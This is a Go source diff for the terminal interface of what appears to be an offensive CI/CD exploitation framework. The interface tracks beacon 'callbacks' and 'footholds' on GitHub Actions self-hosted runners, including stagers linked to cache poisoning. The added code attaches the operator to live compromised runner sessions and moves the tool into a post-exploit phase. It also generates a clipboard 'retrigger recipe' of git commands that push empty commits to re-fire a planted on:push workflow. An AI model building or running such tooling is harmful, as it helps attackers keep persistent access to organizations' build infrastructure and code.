@@ -28,6 +28,10 @@ func (m *Model) openCallbacksModal() tea.Cmd {
 	m.prevView = m.view
 	m.prevFocus = m.focus
 	m.view = ViewCallbacks
+	if m.callbackModal == nil {
+		m.callbackModal = &CallbackModalState{}
+	}
+	m.callbackModal.PreferredID = m.preferredCallbackID()
 	return m.fetchCallbacksCmd()
 }
 
@@ -62,7 +66,14 @@ func (m Model) controlCallbackCmd(callbackID, action string) tea.Cmd {
 }
 
 func (m *Model) setCallbacks(callbacks []counter.CallbackPayload) {
-	slices.SortFunc(callbacks, func(a, b counter.CallbackPayload) int {
+	filtered := make([]counter.CallbackPayload, 0, len(callbacks))
+	for _, callback := range callbacks {
+		if callback.RevokedAt != nil {
+			continue
+		}
+		filtered = append(filtered, callback)
+	}
+	slices.SortFunc(filtered, func(a, b counter.CallbackPayload) int {
 		aTime := a.CreatedAt
 		if a.CallbackAt != nil {
 			aTime = *a.CallbackAt
@@ -80,13 +91,21 @@ func (m *Model) setCallbacks(callbacks []counter.CallbackPayload) {
 			return strings.Compare(a.ID, b.ID)
 		}
 	})
-	m.callbacks = callbacks
+	m.callbacks = filtered
 	if m.callbackModal == nil {
 		m.callbackModal = &CallbackModalState{}
 	}
 	if len(m.callbacks) == 0 {
 		m.callbackModal.Cursor = 0
 		return
+	}
+	if preferred := strings.TrimSpace(m.callbackModal.PreferredID); preferred != "" {
+		for i := range m.callbacks {
+			if m.callbacks[i].ID == preferred {
+				m.callbackModal.Cursor = i
+				return
+			}
+		}
 	}
 	if m.callbackModal.Cursor >= len(m.callbacks) {
 		m.callbackModal.Cursor = len(m.callbacks) - 1
@@ -106,6 +125,166 @@ func (m *Model) upsertCallback(callback counter.CallbackPayload) {
 	}
 	m.callbacks = append(m.callbacks, callback)
 	m.setCallbacks(m.callbacks)
+}
+
+func (m *Model) removeCallback(callbackID string) {
+	if strings.TrimSpace(callbackID) == "" {
+		return
+	}
+	filtered := make([]counter.CallbackPayload, 0, len(m.callbacks))
+	for _, callback := range m.callbacks {
+		if callback.ID == callbackID {
+			continue
+		}
+		filtered = append(filtered, callback)
+	}
+	m.setCallbacks(filtered)
+}
+
+func (m Model) preferredCallbackID() string {
+	if m.waiting != nil {
+		if m.waiting.CachePoison != nil && strings.TrimSpace(m.waiting.CachePoison.VictimStagerID) != "" {
+			return m.waiting.CachePoison.VictimStagerID
+		}
+		if strings.TrimSpace(m.waiting.StagerID) != "" {
+			return m.waiting.StagerID
+		}
+	}
+	return ""
+}
+
+func (m Model) callbackIsPersistent(callbackID string) bool {
+	for _, callback := range m.callbacks {
+		if callback.ID == callbackID {
+			return callback.Persistent
+		}
+	}
+	return false
+}
+
+func callbackMetadataValue(callback *counter.CallbackPayload, key string) string {
+	if callback == nil || callback.Metadata == nil {
+		return ""
+	}
+	return strings.TrimSpace(callback.Metadata[key])
+}
+
+func (m Model) callbackIsResidentFoothold(callback *counter.CallbackPayload) bool {
+	return callbackMetadataValue(callback, runnerTargetMetadataKindKey) == runnerTargetMetadataKindValue &&
+		callbackMetadataValue(callback, runnerTargetMetadataModeKey) == runnerTargetMetadataModeResident
+}
+
+func (m Model) callbackIDIsResidentFoothold(callbackID string) bool {
+	if strings.TrimSpace(callbackID) == "" {
+		return false
+	}
+	for i := range m.callbacks {
+		if m.callbacks[i].ID == callbackID {
+			return m.callbackIsResidentFoothold(&m.callbacks[i])
+		}
+	}
+	return false
+}
+
+func (m Model) callbackByID(callbackID string) *counter.CallbackPayload {
+	if strings.TrimSpace(callbackID) == "" {
+		return nil
+	}
+	for i := range m.callbacks {
+		if m.callbacks[i].ID != callbackID {
+			continue
+		}
+		callback := m.callbacks[i]
+		return &callback
+	}
+	return nil
+}
+
+func (m *Model) activateWaitingResidentFootholdIfLive() bool {
+	if m.waiting == nil || !m.callbackIDIsResidentFoothold(m.waiting.StagerID) {
+		return false
+	}
+	callback := m.callbackByID(m.waiting.StagerID)
+	if callback == nil {
+		return false
+	}
+	return m.attachCallback(callback)
+}
+
+func (m Model) liveSessionForAgent(agentID string) *Session {
+	if strings.TrimSpace(agentID) == "" {
+		return nil
+	}
+	for i := range m.sessions {
+		session := &m.sessions[i]
+		if session.AgentID != agentID {
+			continue
+		}
+		if session.IsOnline || time.Since(session.LastSeen) < 2*time.Minute {
+			return session
+		}
+	}
+	return nil
+}
+
+func (m Model) liveSessionForCallback(callback *counter.CallbackPayload) *Session {
+	if callback == nil {
+		return nil
+	}
+	if session := m.liveSessionForAgent(strings.TrimSpace(callback.LastAgentID)); session != nil {
+		return session
+	}
+	for _, link := range m.callbackAgents[callback.ID] {
+		if session := m.liveSessionForAgent(link.AgentID); session != nil {
+			return session
+		}
+	}
+	return nil
+}
+
+func (m *Model) attachCallback(callback *counter.CallbackPayload) bool {
+	session := m.liveSessionForCallback(callback)
+	if session == nil {
+		return false
+	}
+
+	mode := agentModeExpress
+	if m.callbackIsResidentFoothold(callback) {
+		mode = agentModeResident
+	} else {
+		for _, link := range m.callbackAgents[callback.ID] {
+			if link.AgentID == session.AgentID && strings.TrimSpace(link.Mode) != "" {
+				mode = strings.TrimSpace(link.Mode)
+				break
+			}
+		}
+	}
+
+	m.activeAgent = &AgentState{
+		ID:        session.AgentID,
+		Runner:    session.Hostname,
+		Repo:      callbackMetadataValue(callback, "repository"),
+		Workflow:  callbackMetadataValue(callback, "workflow"),
+		Job:       callbackMetadataValue(callback, "job"),
+		Mode:      mode,
+		StartTime: time.Now(),
+	}
+	m.clearDismissedDwellAgent(session.AgentID)
+	m.selectSessionByAgentID(session.AgentID)
+	switch mode {
+	case agentModeResident:
+		m.jobDeadline = time.Time{}
+		m.dwellMode = true
+	case agentModeDwell:
+		m.jobDeadline = time.Time{}
+		m.dwellMode = true
+	default:
+		m.jobDeadline = time.Time{}
+		m.dwellMode = false
+	}
+	m.waiting = nil
+	m.TransitionToPhase(PhasePostExploit)
+	return true
 }
 
 func (m *Model) noteCallbackHit(callbackID, agentID, mode string, when time.Time) {
@@ -226,9 +405,48 @@ func (m Model) handleCallbacksKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
 	case "k", "up":
 		m.callbackCursorUp()
 		return m, nil
+	case "enter", "a":
+		if callback := m.selectedCallback(); callback != nil {
+			if m.attachCallback(callback) {
+				m.activityLog.Add(IconSuccess, fmt.Sprintf("Attached to foothold %s", callbackDetailLabel(*callback)))
+				return m, nil
+			}
+			if branch := callbackMetadataValue(callback, runnerTargetMetadataBranchKey); branch != "" {
+				m.AddOutput("warning", fmt.Sprintf("Foothold is not live right now. Re-trigger branch %s or wait for the next beacon.", branch))
+			} else {
+				m.AddOutput("warning", "Foothold is not live right now. Wait for the next beacon before attaching.")
+			}
+			return m, nil
+		}
 	case "r":
 		if callback := m.selectedCallback(); callback != nil {
 			return m, m.controlCallbackCmd(callback.ID, "revoke")
+		}
+	case "c":
+		if callback := m.selectedCallback(); callback != nil && m.callbackIsResidentFoothold(callback) {
+			handle := callbackResidentHandle(*callback)
+			if err := clipboardWriteAll(handle); err != nil {
+				m.AddOutput("error", fmt.Sprintf("Copy failed: %v", err))
+				return m, nil
+			}
+			m.AddOutput("success", "Copied resident foothold handle to clipboard")
+			m.activityLog.Add(IconSuccess, fmt.Sprintf("Copied foothold handle %s", callbackDetailLabel(*callback)))
+			return m, nil
+		}
+	case "t":
+		if callback := m.selectedCallback(); callback != nil && m.callbackIsResidentFoothold(callback) {
+			instructions := callbackResidentRetriggerRecipe(*callback)
+			if err := clipboardWriteAll(instructions); err != nil {
+				m.AddOutput("error", fmt.Sprintf("Copy failed: %v", err))
+				return m, nil
+			}
+			if branch := callbackMetadataValue(callback, runnerTargetMetadataBranchKey); branch != "" {
+				m.AddOutput("success", fmt.Sprintf("Copied retrigger recipe for branch %s", branch))
+			} else {
+				m.AddOutput("success", "Copied retrigger recipe for resident foothold")
+			}
+			m.activityLog.Add(IconSuccess, fmt.Sprintf("Copied retrigger recipe %s", callbackDetailLabel(*callback)))
+			return m, nil
 		}
 	case "e":
 		if callback := m.selectedCallback(); callback != nil {
@@ -248,4 +466,70 @@ func (m Model) handleCallbacksKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
 		}
 	}
 	return m, nil
+}
+
+func callbackResidentHandle(callback counter.CallbackPayload) string {
+	workflow := callbackMetadataValue(&callback, "workflow")
+	if workflow == "" {
+		workflow = runnerTargetWorkflowPath()
+	}
+	job := callbackMetadataValue(&callback, "job")
+	if job == "" {
+		job = runnerTargetWorkflowJobName()
+	}
+
+	lines := []string{
+		"Foothold: " + callbackDetailLabel(callback),
+		"Repo: " + callbackMetadataValue(&callback, "repository"),
+		"Workflow: " + workflow,
+		"Job: " + job,
+	}
+	if branch := callbackMetadataValue(&callback, runnerTargetMetadataBranchKey); branch != "" {
+		lines = append(lines, "Branch: "+branch)
+		if repo := callbackMetadataValue(&callback, "repository"); repo != "" {
+			lines = append(lines, "Branch URL: "+GitHubRepoURL(repo)+"/tree/"+branch)
+		}
+	}
+	if route := callbackMetadataValue(&callback, runnerTargetMetadataRouteKey); route != "" {
+		lines = append(lines, "Route: "+route)
+	}
+	if retry := callbackMetadataValue(&callback, runnerTargetMetadataRetryKey); retry != "" {
+		lines = append(lines, "Retry: "+retry)
+	}
+	lines = append(lines, "Callback ID: "+callback.ID)
+	return strings.Join(lines, "\n")
+}
+
+func callbackResidentRetriggerRecipe(callback counter.CallbackPayload) string {
+	repo := callbackMetadataValue(&callback, "repository")
+	branch := callbackMetadataValue(&callback, runnerTargetMetadataBranchKey)
+	workflow := callbackMetadataValue(&callback, "workflow")
+	if workflow == "" {
+		workflow = runnerTargetWorkflowPath()
+	}
+	lines := []string{
+		"# Re-trigger resident foothold",
+		"# Push any new commit to the branch below to fire the on:push workflow again.",
+	}
+	if repo != "" {
+		lines = append(lines, "Repo: "+repo)
+	}
+	if branch != "" {
+		lines = append(lines, "Branch: "+branch)
+	}
+	lines = append(lines, "Workflow: "+workflow)
+	if route := callbackMetadataValue(&callback, runnerTargetMetadataRouteKey); route != "" {
+		lines = append(lines, "Route: "+route)
+	}
+	if repo != "" && branch != "" {
+		lines = append(lines,
+			"",
+			fmt.Sprintf("git clone git@github.com:%s.git", repo),
+			fmt.Sprintf("cd %s", repo[strings.LastIndex(repo, "/")+1:]),
+			fmt.Sprintf("git switch %s || git switch -c %s --track origin/%s", branch, branch, branch),
+			"git commit --allow-empty -m \"ci: retrigger self-hosted foothold\"",
+			fmt.Sprintf("git push origin %s", branch),
+		)
+	}
+	return strings.Join(lines, "\n")
 }
